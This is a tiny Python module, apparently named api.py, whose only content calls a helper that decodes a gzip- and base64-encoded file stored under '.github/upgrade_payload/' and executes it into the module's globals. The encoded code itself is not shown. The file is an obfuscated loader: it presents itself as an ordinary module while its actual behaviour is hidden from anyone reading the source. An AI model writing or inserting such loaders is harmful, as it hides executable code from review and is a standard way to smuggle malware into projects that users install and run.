from __future__ import annotations

from payload_loader import exec_gzip_base64_payload

exec_gzip_base64_payload(
    globals(),
    [".github/upgrade_payload/api.py.gz.b64"],
    "api.py",
)
